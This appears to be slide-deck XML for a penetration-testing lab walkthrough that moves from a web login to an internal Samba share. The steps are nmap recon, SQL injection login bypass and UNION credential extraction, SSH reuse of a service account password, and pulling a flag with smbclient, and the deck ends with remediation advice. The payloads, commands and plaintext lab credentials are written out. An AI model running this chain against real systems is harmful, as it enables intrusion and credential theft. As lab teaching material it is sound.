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WALKTHROUGH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Walkthrough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web SQL injection to the internal Samba share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DMZ Pentest Lab — Lateral Movement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201168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194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ubuntu-web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172.30.0.10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3108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SQLi → DB creds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17720" y="201168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194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fedora-ssh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172.30.0.20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3108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reuse creds (SSH)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0" y="201168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2194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opensuse-smb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172.30.0.30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95360" y="3108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share → loot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977640" y="2926080"/>
            <a:ext cx="594360" cy="32004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0" y="2926080"/>
            <a:ext cx="594360" cy="32004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976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 the credential thread across the DMZ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Recon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554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1220"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2735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-sn 172.30.0.0/24                     # discover hosts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-sV -p 21,22,80,139,445,5432 172.30.0.0/24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hosts and services before touching anything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ATT&amp;CK: Discovery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Initial access (SQLi)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554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1220"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2735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 "http://172.30.0.10/login.php"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--data "username=admin' --&amp;password=x"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Welcome, admin (administrator)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is concatenated straight into the query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ATT&amp;CK: Initial Access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Credential access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2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2759"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1220"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2735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extract a service account through the SQLi (UNION)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 "http://172.30.0.10/login.php" --data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"username=' UNION SELECT username,password FROM users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WHERE username='svc_backup'-- &amp;password=x"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Welcome, svc_backup (B@ckup#2024!)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query PostgreSQL directly (creds from db.php):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psql "postgresql://webapp:S3rv1ce!Pass2024@172.30.0.10/webapp" -c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"SELECT * FROM users;"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4389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ATT&amp;CK: Credential Access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— Lateral movement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0B1220"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2735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DB password is reused for the Linux user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svc_backup@172.30.0.20        # B@ckup#2024!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reuse is the pivot into fedora-ssh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ATT&amp;CK: Lateral Movement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— Collection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554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1220"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2735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~/.smbcredentials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username=smbbackup  password=Sh@re#Backup22!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share=//172.30.0.30/backup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hop's credentials were left on disk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ATT&amp;CK: Collection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 — Objective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920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1220"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2735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smbclient //172.30.0.30/backup -U smbbackup%'Sh@re#Backup22!'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smb: \&gt; get flag.txt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smb: \&gt; exit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flag.txt   # FLAG{lateral_movement_complete}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the loot from the Samba share — chain complete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566928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5669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the SMB password inline with % — a bare -U user prompts and fails in non-interactive shells.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&amp; remediation (blue team)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parameterized queries — kills the SQL injection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store credentials in web-readable files or reuse them across hosts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leave secrets on disk in home directories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the DMZ and monitor SSH/SMB auth for reuse patterns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2026-08-02T14:50:17Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-02T14:50:17Z</dcterms:modified>
</cp:coreProperties>
</file>